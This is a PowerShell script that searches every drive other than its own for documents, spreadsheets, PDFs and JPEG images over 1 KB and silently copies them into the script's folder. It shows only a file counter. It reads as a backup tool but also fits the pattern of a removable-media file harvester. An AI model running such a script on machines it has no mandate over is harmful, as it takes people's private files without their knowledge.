function Get-FilesExcludingDirs {
    param (
        [string]$Path,
        [string[]]$ExcludeDirs,
        [string[]]$FileTypes
    )

    $items = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue

    foreach ($item in $items) {
        if ($item.PSIsContainer) {
            if ($ExcludeDirs -contains $item.Name.ToLower()) {
                continue
            } else {
                Get-FilesExcludingDirs -Path $item.FullName -ExcludeDirs $ExcludeDirs -FileTypes $FileTypes
            }
        } else {
            foreach ($pattern in $FileTypes) {
                if ($item.Name -like $pattern) {
                    $item
                    break
                }
            }
        }
    }
}

$excludedDirs = @("windows", "program files", "program files (x86)", "system volume information")
$fileTypes = @("*.doc","*.docx","*.pdf","*.jpg","*.jpeg","*.xls","*.xlsx")

$destination = $PSScriptRoot
$destDriveLetter = $destination.Substring(0,1).ToUpper()
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null -and $_.Name.ToUpper() -ne $destDriveLetter }
$createdDirs = New-Object System.Collections.Generic.HashSet[string]

# Initialize file counter
$copiedCount = 0

foreach ($drive in $drives) {
    $source = "$($drive.Name):\"

    Get-FilesExcludingDirs -Path $source -ExcludeDirs $excludedDirs -FileTypes $fileTypes | ForEach-Object {
        $file = $_

        # Only copy if file size is greater than 1 KB (1024 bytes)
        if ($file.Length -gt 1024) {
            $relativePath = $file.FullName.Substring(3)
            $targetPath = Join-Path $destination $relativePath
            $targetDir = Split-Path $targetPath -Parent

            if (-not $createdDirs.Contains($targetDir)) {
                if (-not (Test-Path $targetDir)) {
                    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
                }
                $createdDirs.Add($targetDir) | Out-Null
            }

            Copy-Item -Path $file.FullName -Destination $targetPath -Force -ErrorAction SilentlyContinue

            # Increment and display only the counter
            $copiedCount++
            Write-Host $copiedCount
        }
    }
}
